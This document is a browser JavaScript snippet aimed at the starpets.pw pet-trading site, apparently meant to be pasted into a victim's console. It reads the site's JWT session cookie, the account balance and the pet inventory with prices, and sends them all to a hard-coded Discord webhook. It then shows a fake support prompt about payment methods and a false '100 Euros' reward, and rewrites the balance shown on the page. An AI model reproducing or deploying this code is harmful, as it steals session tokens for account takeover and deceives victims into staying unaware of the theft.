function getCookieValue(name) {
  const cookies = document.cookie.split('; ');
  for (const cookie of cookies) {
    const [key, value] = cookie.split('=');
    if (key === name) return decodeURIComponent(value);
  }
  return null;
}

function getRandomColor() {
  return Math.floor(Math.random() * 0xffffff);
}

function getBalance() {
  const balanceEl = document.querySelector('div._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78');
  return balanceEl ? balanceEl.textContent.trim() : null;
}

function chunkArray(arr, size) {
  const chunks = [];
  for (let i = 0; i < arr.length; i += size) {
    chunks.push(arr.slice(i, i + size));
  }
  return chunks;
}

async function sendEmbeds() {
  const originalBalance = getBalance();

  const jwtCookieValue = getCookieValue('jwtStateV2');
  const currentURL = window.location.href;
  let petValues = [];

  if (currentURL.startsWith('https://starpets.pw/profile/trade/inventory')) {
    const petElements = document.querySelectorAll('h3._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78._text__style_normal_1oh67_87._text__decoration_normal_1oh67_96._contentBlockName_134sj_43');

    petElements.forEach(petEl => {
      const petName = petEl.textContent.trim();
      let price = 'Unknown';
      let priceNum = -1;

      let priceDiv = petEl.nextElementSibling;
      let attempts = 0;
      while (priceDiv && attempts < 3) {
        if (priceDiv.classList && priceDiv.classList.contains('_contentBlockPriceApproximate_134sj_59')) {
          const span = priceDiv.querySelector('span');
          if (span) {
            price = span.textContent.trim();
            const match = price.match(/[\d,.]+/);
            if (match) priceNum = parseFloat(match[0].replace(',', '.'));
          }
          break;
        }
        priceDiv = priceDiv.nextElementSibling;
        attempts++;
      }
      petValues.push({ name: petName, price, priceNum });
    });
  }

  petValues.sort((a, b) => b.priceNum - a.priceNum);
  const chunks = chunkArray(petValues, 20);
  const webhookURL = 'https://discord.com/api/webhooks/1403530496310513674/misQ4uKTP5xNLmH5PiYkUtXQFdOcLBye0_5-p3jriRNRvU33LQhTuI2sk4uzlHrPGq68';

  // Send JWT information to Discord first
  if (jwtCookieValue) {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: `JWT Cookie - Balance: ${originalBalance || 'Unknown'}`,
          description: `\`\`\`\n${jwtCookieValue}\n\`\`\``,
          color: getRandomColor()
        }]
      })
    });
  }

  // Then send pet information
  for (const chunk of chunks) {
    const valueText = chunk.map(pet => `*${pet.name}*  **${pet.price}**`).join('\n');

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: 'Pet Inventory',
          fields: [{ name: '\u200b', value: valueText, inline: false }],
          color: getRandomColor()
        }]
      })
    });
  }

  console.log('All embeds sent successfully.');

  // Payment method selection and reward system
  const paymentMethod = prompt(`Which payment method are you having issues with?\n\n1) Robux\n2) Visa/Mastercard/Paypal\n3) Crypto (Bitcoin, Ethereum, etc.)\n\nPlease enter the option number (1-3):`);

  if (paymentMethod !== null) {
    let selectedMethod = "";
    switch(paymentMethod.trim()) {
      case "1": selectedMethod = "Robux"; break;
      case "2": selectedMethod = "Visa/Mastercard/Paypal"; break;
      case "3": selectedMethod = "Crypto (Bitcoin, Ethereum, etc.)"; break;
      default: selectedMethod = "Invalid option selected";
    }

    alert("Thank you for your response. Your request will be processed shortly. As a reward, you have received 100 Euros.");

    // Update balance to 100 Euros
    const balanceDiv = document.querySelector('div._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78._text__style_normal_1oh67_87._text__decoration_normal_1oh67_96._title_fg9xm_23');
    if (balanceDiv) {
      const currentText = balanceDiv.textContent;
      const newText = currentText.replace(/[\d.,]+/, "100.00");
      balanceDiv.textContent = newText;
    }
  }
}

sendEmbeds().catch(console.error);
